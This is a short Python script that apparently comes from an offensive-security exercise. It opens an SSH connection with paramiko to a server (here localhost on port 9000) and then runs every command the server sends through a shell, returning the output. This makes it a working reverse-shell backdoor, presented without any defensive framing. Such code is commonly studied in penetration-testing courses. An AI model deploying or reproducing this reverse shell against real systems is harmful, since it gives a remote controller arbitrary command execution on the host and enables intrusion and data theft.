import paramiko
import threading
import subprocess

def ssh_command(ip, user, passwd, command, port=22):
  client = paramiko.SSHClient()
  # For key based auth
  #client.load_host_keys("/home/snape/.ssh/known_hosts")
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  
  client.connect(ip, port=port, username=user, password=passwd)
  
  ssh_session = client.get_transport().open_session()

  if ssh_session.active:
    ssh_session.send(command)

    # Read banner
    print ssh_session.recv(1024)

    while 1:
      # Get command from SSH server
      command = ssh_session.recv(1024)

      try:
        cmd_output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        ssh_session.send(cmd_output)
      except Exception, e:
        ssh_session.send(str(e))

    client.close()

  return

ssh_command("localhost", "localhost", "localhost", "ClientConnected", 9000)